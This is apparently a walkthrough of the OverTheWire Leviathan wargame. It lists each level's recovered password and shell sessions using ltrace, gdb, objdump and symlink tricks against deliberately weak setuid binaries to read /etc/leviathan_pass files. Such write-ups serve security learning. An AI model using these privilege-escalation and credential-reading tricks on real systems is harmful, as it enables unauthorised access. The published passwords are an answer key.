## Leviathan
### Level 1:
 - Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH.
 - Username: leviathan0
 - Password: leviathan0

```
leviathan0@melinda:~$ egrep password .backup/bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71" password to leviathan1</A>
```

### Level 2:
 - Username: leviathan1
 - Password: rioGegei8m

```
leviathan1@melinda:~$ echo asd | ltrace ./check 2>&1 | egrep strcmp
strcmp("asd", "sex")                             = -1

leviathan1@melinda:~$ ./check
sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```



### Level 3:
 - Username: leviathan2
 - Password: ougahZi8Ta

```
leviathan2@melinda:/tmp$ ln -s /etc/leviathan_pass/leviathan2 "/tmp/aabcd e"
leviathan2@melinda:/tmp$ ln -s /etc/leviathan_pass/leviathan3 "/tmp/aabcd"
leviathan2@melinda:/tmp$ ~/printfile "aabcd e"
Ahdiemoo1j
```






### Level 4:
 - Username: leviathan3
 - Password: Ahdiemoo1j

```
leviathan3@melinda:~$ objdump -D level3  | less

80485ae:       f3 a6                   repz cmpsb %es:(%edi),%ds:(%esi)

do_stuff


objdump -D level3  | less
#b do_stuff
break *0x80485ae
set step-mode on
display/i $pc
run
(gdb) x/1bs $edi
0x8048690:      "snlprintf\n"

leviathan3@melinda:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
$ 
```


### Level 5:
 - Username: leviathan4
 - Password: vuH0coox6m


```
leviathan4@melinda:~$ ./.trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
leviathan4@melinda:~$ ltrace ./.trash/bin 
__libc_start_main(0x80484cd, 1, 0xffffd774, 0x80485c0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                                                                                  = 0
+++ exited (status 255) +++

http://unix.stackexchange.com/questions/98948/ascii-binary-tools
chrbin() {
        echo $(printf \\$(echo "ibase=2; obase=8; $1" | bc))
}

ordbin() {
  a=$(printf '%d' "'$1")
  echo "obase=2; $a" | bc
}

ascii2bin() {
    echo -n $* | while IFS= read -r -n1 char
    do
        ordbin $char | tr -d '\n'
        echo -n " "
    done
}

bin2ascii() {
    for bin in $*
    do
        chrbin $bin | tr -d '\n'
    done
}

leviathan4@melinda:~$ bin2ascii $n ; echo
Tith4cokei
```



### Level 6:
 - Username: leviathan5
 - Password: Tith4cokei


```
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log ; ./leviathan5 
UgaoFee4li
```



### Level 7:
 - Username: leviathan6
 - Password: UgaoFee4li


```
leviathan6@melinda:~$ ltrace ./leviathan6 1111
__libc_start_main(0x804850d, 2, 0xffffd794, 0x8048590 <unfinished ...>
atoi(0xffffd8c1, 0xffffd794, 0xffffd7a0, 0xf7e5510d)                                                                          = 1111
puts("Wrong"Wrong
)                                                                                                                 = 6
+++ exited (status 6) +++

 8048550:       e8 ab fe ff ff          call   8048400 <atoi@plt>
 8048555:       3b 44 24 1c             cmp    0x1c(%esp),%eax
 8048559:       75 1a                   jne    8048575 <main+0x68>
 804855b:       c7 04 24 ef 03 00 00    movl   $0x3ef,(%esp)
 8048562:       e8 39 fe ff ff          call   80483a0 <seteuid@plt>
 8048567:       c7 04 24 3a 86 04 08    movl   $0x804863a,(%esp)
 804856e:       e8 4d fe ff ff          call   80483c0 <system@plt>
 8048573:       eb 0c                   jmp    8048581 <main+0x74>
 8048575:       c7 04 24 42 86 04 08    movl   $0x8048642,(%esp)
 804857c:       e8 2f fe ff ff          call   80483b0 <puts@plt>
 8048581:       c9                      leave  
 8048582:       c3                      ret    


gdb leviathan6 
break *0x8048555
set step-mode on
display/i $pc
run 0001
x/1wd $esp+0x1c


0xffffd6ac:     7123

(gdb) x/1wc "0x1c(%esp)"
0x804b008:      48 '0'

./leviathan6 7123
cat /etc/leviathan_pass/leviathan7


ahy7MaeBo9
```



### Level 8:
 - Username: leviathan7
 - Password: ahy7MaeBo9

```
leviathan7@melinda:~$ ls
CONGRATULATIONS
```
